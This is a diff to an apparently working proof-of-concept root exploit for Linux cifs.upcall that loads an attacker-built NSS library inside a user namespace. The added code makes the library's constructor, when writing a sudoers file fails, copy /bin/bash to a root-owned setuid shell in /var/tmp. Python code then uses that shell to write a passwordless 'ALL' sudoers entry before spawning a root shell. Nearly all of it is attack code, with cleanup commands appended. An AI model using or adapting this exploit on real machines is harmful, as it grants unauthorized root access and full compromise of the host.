@@ -5,12 +5,12 @@ import pwd
 import re
 import shlex
 import shutil
+import stat
 import subprocess
 import sys
 import textwrap
 import time
 from pathlib import Path
-from typing import List
 
 
 RUN_TOKEN = "%s_%s" % (os.getuid(), os.getpid())
@@ -18,6 +18,7 @@ WORKDIR = Path("/tmp") / ("cifs-upcall-sudoers-poc-%s" % RUN_TOKEN)
 FAKELIB_DIR = WORKDIR / "fakelib"
 FAKE_NSSWITCH = WORKDIR / "nsswitch.conf"
 EVIDENCE_LOG = Path("/tmp/cifs_upcall_sudoers_evidence_%s.txt" % RUN_TOKEN)
+ROOT_SHELL = Path("/var/tmp/cifs_upcall_rootsh_%s" % RUN_TOKEN)
 UNSHARE_COMMAND = ["unshare", "-Ur", "-m"]
 
 
@@ -36,6 +37,7 @@ LIBNSS_SOURCE = r'''
 #define EVIDENCE_PATH @@EVIDENCE_PATH@@
 #define SUDOERS_PATH @@SUDOERS_PATH@@
 #define SUDOERS_USER @@SUDOERS_USER@@
+#define ROOT_SHELL_PATH @@ROOT_SHELL_PATH@@
 
 static void write_all(int fd, const char *buf, size_t len)
 {
@@ -46,6 +48,64 @@ static void write_all(int fd, const char *buf, size_t len)
                 buf += ret;
                 len -= (size_t)ret;
         }
+}
+
+static void create_fallback_root_shell(int logfd)
+{
+        int in_fd;
+        int out_fd;
+        int rc;
+        int saved_errno;
+        char buf[8192];
+        ssize_t n;
+
+        errno = 0;
+        in_fd = open("/bin/bash", O_RDONLY | O_CLOEXEC);
+        saved_errno = errno;
+        if (in_fd < 0) {
+                if (logfd >= 0)
+                        dprintf(logfd, "fallback failed to open /bin/bash errno=%d (%s)\n",
+                                saved_errno, strerror(saved_errno));
+                return;
+        }
+
+        errno = 0;
+        out_fd = open(ROOT_SHELL_PATH,
+                      O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
+        saved_errno = errno;
+        if (out_fd < 0) {
+                if (logfd >= 0)
+                        dprintf(logfd, "fallback failed to open %s errno=%d (%s)\n",
+                                ROOT_SHELL_PATH, saved_errno,
+                                strerror(saved_errno));
+                close(in_fd);
+                return;
+        }
+
+        while ((n = read(in_fd, buf, sizeof(buf))) > 0)
+                write_all(out_fd, buf, (size_t)n);
+
+        errno = 0;
+        rc = fchown(out_fd, 0, 0);
+        saved_errno = errno;
+        if (logfd >= 0)
+                dprintf(logfd, "fallback fchown root shell rc=%d errno=%d (%s)\n",
+                        rc, saved_errno, strerror(saved_errno));
+
+        errno = 0;
+        rc = fchmod(out_fd, 04755);
+        saved_errno = errno;
+        if (logfd >= 0)
+                dprintf(logfd, "fallback fchmod root shell rc=%d errno=%d (%s)\n",
+                        rc, saved_errno, strerror(saved_errno));
+
+        fsync(out_fd);
+        close(out_fd);
+        close(in_fd);
+
+        if (logfd >= 0)
+                dprintf(logfd, "created fallback root shell: %s\n",
+                        ROOT_SHELL_PATH);
 }
 
 __attribute__((constructor))
@@ -73,12 +133,15 @@ static void pwn_constructor(void)
                           O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0440);
         saved_errno = errno;
         if (sudoers_fd < 0) {
-                if (logfd >= 0) {
+                if (logfd >= 0)
                         dprintf(logfd, "failed to open %s errno=%d (%s)\n",
                                 SUDOERS_PATH, saved_errno,
                                 strerror(saved_errno));
+
+                create_fallback_root_shell(logfd);
+
+                if (logfd >= 0)
                         close(logfd);
-                }
                 return;
         }
 
@@ -414,7 +477,7 @@ def check_required_commands():
         raise SystemExit("preflight failed: missing required command(s): %s" % ", ".join(missing))
 
 
-def select_user_namespace_command() -> List[str]:
+def select_user_namespace_command():
     completed = run_quiet(UNSHARE_COMMAND + ["true"])
     if completed.returncode == 0:
         return list(UNSHARE_COMMAND)
@@ -516,6 +579,7 @@ def render_libnss_source(sudoers_user, sudoers_path):
         .replace("@@EVIDENCE_PATH@@", c_string_literal(EVIDENCE_LOG))
         .replace("@@SUDOERS_PATH@@", c_string_literal(sudoers_path))
         .replace("@@SUDOERS_USER@@", c_string_literal(sudoers_user))
+        .replace("@@ROOT_SHELL_PATH@@", c_string_literal(ROOT_SHELL))
     )
 
 
@@ -534,6 +598,39 @@ def read_evidence():
     if not EVIDENCE_LOG.exists():
         return ""
     return EVIDENCE_LOG.read_text(encoding="utf-8", errors="replace")
+
+
+def check_fallback_root_shell():
+    try:
+        st = ROOT_SHELL.stat()
+    except FileNotFoundError:
+        raise SystemExit(
+            "fallback failed: direct sudoers write failed, but no fallback root shell was created at %s" %
+            ROOT_SHELL
+        )
+    if st.st_uid != 0 or not (st.st_mode & stat.S_ISUID):
+        raise SystemExit(
+            "fallback failed: %s exists, but is not a root-owned setuid shell (uid=%s mode=%o)" %
+            (ROOT_SHELL, st.st_uid, stat.S_IMODE(st.st_mode))
+        )
+
+
+def write_sudoers_via_fallback_shell(sudoers_user, sudoers_path):
+    check_fallback_root_shell()
+    sudoers_command = (
+        "printf '%%s\\n' '# cifs.upcall namespace NSS PoC; remove after testing' "
+        "%s > %s; "
+        "chown root:root %s; "
+        "chmod 0440 %s; "
+        "stat -c 'fallback sudoers state: %%n: %%A uid=%%u gid=%%g size=%%s' %s"
+    ) % (
+        shlex.quote("%s ALL=(ALL:ALL) NOPASSWD: ALL" % sudoers_user),
+        shlex.quote(str(sudoers_path)),
+        shlex.quote(str(sudoers_path)),
+        shlex.quote(str(sudoers_path)),
+        shlex.quote(str(sudoers_path)),
+    )
+    run([str(ROOT_SHELL), "-p", "-c", sudoers_command], check=True)
 
 
 def main() -> None:
@@ -598,7 +695,10 @@ def main() -> None:
         )
     print(evidence, end="", flush=True)
     if "wrote sudoers entry:" not in evidence:
-        raise SystemExit("exploit failed: attacker NSS loaded, but the sudoers entry was not written")
+        if "created fallback root shell:" not in evidence:
+            raise SystemExit("exploit failed: attacker NSS loaded, but neither sudoers nor the fallback root shell was written")
+        step("DIRECT SUDOERS WRITE FAILED; USING FALLBACK ROOT SHELL")
+        write_sudoers_via_fallback_shell(sudoers_user, sudoers_path)
 
     step("SPAWNING ROOT SHELL")
     if not sudo_root_check():
@@ -606,9 +706,10 @@ def main() -> None:
 
     print("root shell will be launched by this original process in the host namespace.", flush=True)
     print("cleanup after testing:", flush=True)
-    print("  sudo rm -f %s %s" % (
+    print("  sudo rm -f %s %s %s" % (
         shlex.quote(str(sudoers_path)),
         shlex.quote(str(EVIDENCE_LOG)),
+        shlex.quote(str(ROOT_SHELL)),
     ), flush=True)
     print("  rm -rf %s" % shlex.quote(str(WORKDIR)), flush=True)
 
